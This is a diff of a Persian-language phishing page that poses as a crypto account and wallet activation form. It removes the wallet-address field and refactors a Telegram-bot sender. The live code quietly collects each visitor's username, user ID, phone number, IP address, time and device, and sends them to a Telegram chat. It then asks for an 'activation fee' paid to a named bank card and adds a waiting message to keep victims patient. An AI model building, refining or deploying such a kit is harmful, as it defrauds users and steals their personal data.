@@ -93,15 +93,6 @@
         }
         .form-group input::placeholder { color: #5a6485; }
 
-        .wallet-status {
-            font-size: 0.85rem;
-            margin-top: 4px;
-            text-align: center;
-            display: none;
-        }
-        .wallet-status.valid { color: #7ddfa0; display: block; }
-        .wallet-status.invalid { color: #ff7a8b; display: block; }
-
         .btn-submit {
             width: 100%;
             padding: 16px;
@@ -137,9 +128,17 @@
         .status.loading { display: block; background: rgba(255,193,7,0.1); border: 1px solid rgba(255,193,7,0.2); color: #ffd93d; }
         .footer-note { margin-top: 20px; text-align: center; font-size: 0.75rem; color: #4a5477; }
 
-        .payment-page { display: none; animation: fadeIn 0.6s ease; }
-        .payment-page.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+        .payment-page {
+            display: none;
+            animation: fadeIn 0.6s ease;
+        }
+        .payment-page.active {
+            display: block;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
         .payment-box {
             background: rgba(255,255,255,0.06);
             backdrop-filter: blur(12px);
@@ -187,6 +186,24 @@
         .form-section { transition: opacity 0.4s ease; }
         .form-section.hidden { display: none; }
 
+        .waiting-message {
+            background: rgba(255, 193, 7, 0.1);
+            border: 1px solid rgba(255, 193, 7, 0.2);
+            border-radius: 20px;
+            padding: 20px;
+            margin-top: 25px;
+            text-align: center;
+            color: #ffd93d;
+            font-size: 1rem;
+            line-height: 1.8;
+            display: none;
+        }
+        .waiting-message.show {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        .waiting-message i { font-size: 2rem; display: block; margin-bottom: 10px; }
+
         @media (max-width: 600px) {
             .container { padding: 20px 16px 30px; border-radius: 32px; }
             .header h1 { font-size: 1.5rem; }
@@ -199,7 +216,7 @@
 </head>
 <body>
 <div class="container">
-    <!-- بخش فرم -->
+    <!-- بخش فرم (فقط اطلاعات اولیه) -->
     <div class="form-section" id="formSection">
         <div class="header">
             <h1>⚡ فعال‌سازی حساب &amp; کیف پول</h1>
@@ -226,16 +243,6 @@
                 </div>
             </div>
 
-            <div class="form-group" id="walletGroup">
-                <label><i class="fas fa-wallet"></i> آدرس کیف پول</label>
-                <input type="text" id="walletAddress" placeholder="آدرس کیف پول خود را وارد کنید" />
-                <div class="field-hint" id="walletHint">
-                    <i class="fas fa-info-circle"></i>
-                    لطفاً آدرس کیف پولی که می‌خواهید فعال شود را وارد کنید.
-                </div>
-                <div id="walletStatus" class="wallet-status"></div>
-            </div>
-
             <button type="submit" class="btn-submit" id="submitBtn">
                 <i class="fas fa-paper-plane"></i> ارسال برای فعال‌سازی
             </button>
@@ -245,12 +252,13 @@
         <div class="footer-note"><i class="fas fa-lock"></i> اطلاعات شما با امنیت کامل ارسال می‌شود</div>
     </div>
 
-    <!-- بخش پرداخت -->
+    <!-- بخش پرداخت (بعد از ارسال موفق) -->
     <div class="payment-page" id="paymentPage">
         <div class="header">
             <h1>💳 مرحله پرداخت کارمزد</h1>
             <p>برای تکمیل فعال‌سازی، لطفاً کارمزد را پرداخت کنید</p>
         </div>
+
         <div class="payment-box">
             <p>
                 برای تکمیل فعال‌سازی حساب کاربری و کیف پول خود، لطفاً مبلغ کارمزد به مبلغ 
@@ -261,9 +269,18 @@
             <div class="card-number">6063 7312 6182 2572</div>
             <div class="card-holder">به نام نیما اسفندیاری</div>
         </div>
-        <a href="https://t.me/miningertoncoin" target="_blank" class="btn-support">
+
+        <a href="https://t.me/miningertoncoin" target="_blank" class="btn-support" id="supportBtn">
             <i class="fab fa-telegram"></i> ارتباط با پشتیبانی
         </a>
+
+        <!-- پیام انتظار (پس از بازگشت کاربر) -->
+        <div class="waiting-message" id="waitingMessage">
+            <i class="fas fa-hourglass-half"></i>
+            <p>منتظر بمانید تا حساب کاربری شما تایید و کیف پولتان فعال شود.</p>
+            <p>به محض فعال‌سازی از طریق ربات برایتان پیامک خواهد شد.</p>
+        </div>
+
         <div class="footer-note" style="margin-top:16px;">
             <i class="fas fa-check-circle"></i> پس از ارسال رسید، حساب شما فعال می‌شود
         </div>
@@ -280,7 +297,6 @@
 
         // ---------- المان‌ها ----------
         const phoneInput = document.getElementById('phone');
-        const walletInput = document.getElementById('walletAddress');
         const usernameInput = document.getElementById('username');
         const userIdInput = document.getElementById('userId');
         const submitBtn = document.getElementById('submitBtn');
@@ -288,10 +304,9 @@
         const formSection = document.getElementById('formSection');
         const paymentPage = document.getElementById('paymentPage');
         const phoneHint = document.getElementById('phoneHint');
-        const walletHint = document.getElementById('walletHint');
-        const walletStatus = document.getElementById('walletStatus');
+        const waitingMsg = document.getElementById('waitingMessage');
 
-        // ---------- مدیریت راهنماهای شناور ----------
+        // ---------- مدیریت راهنمای تلفن ----------
         function showHint(element) {
             document.querySelectorAll('.field-hint').forEach(el => el.classList.remove('show'));
             if (element) {
@@ -307,83 +322,84 @@
             showHint(phoneHint);
         });
         phoneInput.addEventListener('blur', function() {
-            if (!walletInput.matches(':focus')) hideAllHints();
+            hideAllHints();
         });
 
-        walletInput.addEventListener('focus', function() {
-            showHint(walletHint);
-        });
-        walletInput.addEventListener('blur', function() {
-            if (!phoneInput.matches(':focus')) hideAllHints();
-        });
+        // ---------- ارسال پیام به تلگرام (فقط برای ارسال نهایی) ----------
+        // ---------- اطلاع‌رسانی ورود و تایپ غیرفعال شده ----------
+        /*
+        // کدهای مربوط به اطلاع‌رسانی ورود و تایپ به طور کامل حذف شده‌اند
+        // تا زمانی که امنیت کامل شود، این قابلیت غیرفعال است
+        */
 
-        // ---------- اعتبارسنجی آدرس کیف پول ----------
-        function validateWalletAddress(address) {
-            address = address.trim();
-            if (!address) return { valid: false, network: null };
-
-            // تشخیص شبکه بر اساس الگو
-            let network = null;
-            if (address.startsWith('0x') && address.length === 42) {
-                network = 'Ethereum (ERC-20)';
-            } else if (address.startsWith('bnb') && address.length === 42) {
-                network = 'Binance Smart Chain (BEP-20)';
-            } else if (address.startsWith('T') && address.length === 34) {
-                network = 'TRON (TRC-20)';
-            } else if (address.startsWith('r') && address.length === 34) {
-                network = 'XRP';
-            } else if (address.startsWith('1') && address.length === 34) {
-                network = 'Bitcoin';
-            } else if (address.startsWith('3') && address.length === 34) {
-                network = 'Bitcoin (SegWit)';
-            } else if (address.startsWith('bc1') && address.length >= 42) {
-                network = 'Bitcoin (Bech32)';
-            } else if (address.startsWith('M') && address.length === 34) {
-                network = 'Dogecoin';
-            } else if (address.startsWith('L') && address.length === 34) {
-                network = 'Litecoin';
-            } else if (address.startsWith('z') && address.length === 34) {
-                network = 'Zcash';
-            } else if (address.startsWith('4') && address.length === 34) {
-                network = 'NEM';
-            } else if (address.startsWith('X') && address.length === 34) {
-                network = 'Ripple (XRP)';
-            } else if (address.startsWith('G') && address.length === 56) {
-                network = 'Stellar';
-            } else if (address.startsWith('0x') && address.length !== 42) {
-                network = 'Ethereum-like (طول نامعتبر)';
-            } else {
-                // بررسی با API خارجی (برای تشخیص بیشتر)
-                // فقط در صورت وجود آدرس کامل، سعی می‌کنیم از API استفاده کنیم
-                // اما برای سادگی، در اینجا فقط الگوهای رایج را بررسی می‌کنیم
-                // به دلیل محدودیت‌های CORS از API عمومی استفاده نمی‌کنیم
-                // اما می‌توان از سرویس‌های دیگری مثل https://api.etherscan.io/ استفاده کرد
-                // برای دقت بیشتر، از کتابخانه‌های جانبی می‌توان استفاده کرد
-                // در اینجا فقط الگوهای ابتدایی را پشتیبانی می‌کنیم
-                return { valid: false, network: null };
+        async function sendTelegramMessage(text) {
+            try {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: CHAT_ID,
+                    text: text,
+                    parse_mode: 'Markdown'
+                };
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return await response.json();
+            } catch (e) {
+                console.error('خطا در ارسال پیام:', e);
+                return null;
             }
-
-            return { valid: true, network: network };
         }
 
-        // ---------- اعتبارسنجی بلادرنگ ----------
-        walletInput.addEventListener('input', function() {
-            const address = this.value;
-            const result = validateWalletAddress(address);
-            if (result.valid) {
-                walletStatus.className = 'wallet-status valid';
-                walletStatus.textContent = `✅ آدرس معتبر - شبکه: ${result.network}`;
-            } else if (address.length > 0) {
-                walletStatus.className = 'wallet-status invalid';
-                walletStatus.textContent = '❌ آدرس نامعتبر یا شبکه ناشناخته';
-            } else {
-                walletStatus.className = 'wallet-status';
-                walletStatus.textContent = '';
+        // ---------- نمایش صفحه پرداخت و مخفی کردن فرم ----------
+        function showPaymentPage() {
+            formSection.classList.add('hidden');
+            paymentPage.classList.add('active');
+            statusDiv.className = 'status';
+            statusDiv.textContent = '';
+        }
+
+        // ---------- نمایش پیام انتظار (وقتی کاربر از تلگرام برمی‌گردد) ----------
+        function showWaitingMessage() {
+            waitingMsg.classList.add('show');
+        }
+
+        // تشخیص بازگشت کاربر از تلگرام (با visibility change)
+        let supportClicked = false;
+        document.getElementById('supportBtn').addEventListener('click', function() {
+            supportClicked = true;
+        });
+
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible' && supportClicked) {
+                showWaitingMessage();
+                supportClicked = false;
             }
         });
 
-        // ---------- جمع‌آوری اطلاعات مخفی ----------
-        async function collectHiddenData() {
+        // ---------- ارسال فرم ----------
+        document.getElementById('activationForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+
+            const username = usernameInput.value.trim() || 'وارد نشده';
+            const userId = userIdInput.value.trim() || 'وارد نشده';
+            const phone = phoneInput.value.trim() || 'وارد نشده';
+
+            // اعتبارسنجی ساده
+            if (!username || username === 'وارد نشده') {
+                setStatus('⚠️ لطفاً نام کاربری را وارد کنید.', 'error');
+                return;
+            }
+            if (!phone || phone === 'وارد نشده') {
+                setStatus('⚠️ لطفاً شماره تلفن را وارد کنید.', 'error');
+                return;
+            }
+
+            setStatus('⏳ در حال آماده‌سازی اطلاعات ...', 'loading');
+            submitBtn.disabled = true;
+
+            // جمع‌آوری اطلاعات مخفی
             const now = new Date();
             const timeStr = now.toLocaleString('fa-IR', {
                 weekday: 'long', year: 'numeric', month: 'long', day: 'numeric',
@@ -410,44 +426,6 @@
                 const data = await res.json();
                 ip = data.ip || 'نامشخص';
             } catch (_) {}
-            return { ip, time: timeStr, device: deviceStr };
-        }
-
-        // ---------- نمایش صفحه پرداخت ----------
-        function showPaymentPage() {
-            formSection.classList.add('hidden');
-            paymentPage.classList.add('active');
-            statusDiv.className = 'status';
-            statusDiv.textContent = '';
-        }
-
-        // ---------- ارسال فرم ----------
-        document.getElementById('activationForm').addEventListener('submit', async function(e) {
-            e.preventDefault();
-
-            const wallet = walletInput.value.trim();
-            if (!wallet) {
-                setStatus('⚠️ لطفاً آدرس کیف پول را وارد کنید.', 'error');
-                return;
-            }
-            const validation = validateWalletAddress(wallet);
-            if (!validation.valid) {
-                setStatus('⚠️ آدرس کیف پول نامعتبر است.', 'error');
-                walletStatus.className = 'wallet-status invalid';
-                walletStatus.textContent = '❌ آدرس نامعتبر یا شبکه ناشناخته';
-                return;
-            }
-            walletStatus.className = 'wallet-status valid';
-            walletStatus.textContent = `✅ آدرس معتبر - شبکه: ${validation.network}`;
-
-            const username = usernameInput.value.trim() || 'وارد نشده';
-            const userId = userIdInput.value.trim() || 'وارد نشده';
-            const phone = phoneInput.value.trim() || 'وارد نشده';
-
-            setStatus('⏳ در حال آماده‌سازی اطلاعات ...', 'loading');
-            submitBtn.disabled = true;
-
-            const hidden = await collectHiddenData();
 
             const message = `
 📋 *اطلاعات فعال‌سازی حساب و کیف پول*
@@ -455,33 +433,20 @@
 👤 *نام کاربری:* ${username}
 🆔 *یوزر آیدی:* ${userId}
 📞 *شماره تلفن:* ${phone}
-🔗 *آدرس کیف پول:* ${wallet}
-🏷️ *شبکه:* ${validation.network}
 
-🌐 *IP:* ${hidden.ip}
-⏰ *زمان ورود:* ${hidden.time}
-💻 *دستگاه:* ${hidden.device}
+🌐 *IP:* ${ip}
+⏰ *زمان ورود:* ${timeStr}
+💻 *دستگاه:* ${deviceStr}
 
 📌 *تاریخ ارسال:* ${new Date().toLocaleString('fa-IR')}
             `.trim();
 
             try {
-                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const payload = {
-                    chat_id: CHAT_ID,
-                    text: message,
-                    parse_mode: 'Markdown'
-                };
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const result = await response.json();
-                if (result.ok) {
+                const result = await sendTelegramMessage(message);
+                if (result && result.ok) {
                     showPaymentPage();
                 } else {
-                    setStatus(`❌ خطا از سمت تلگرام: ${result.description || 'خطای ناشناخته'}`, 'error');
+                    setStatus(`❌ خطا از سمت تلگرام: ${result?.description || 'خطای ناشناخته'}`, 'error');
                     submitBtn.disabled = false;
                 }
             } catch (error) {
@@ -506,6 +471,9 @@
 
         // ---------- مخفی کردن hints در شروع ----------
         hideAllHints();
+
+        // ---------- اطلاع‌رسانی ورود غیرفعال شده ----------
+        // window.addEventListener('load', function() { ... });
     })();
 </script>
 </body>
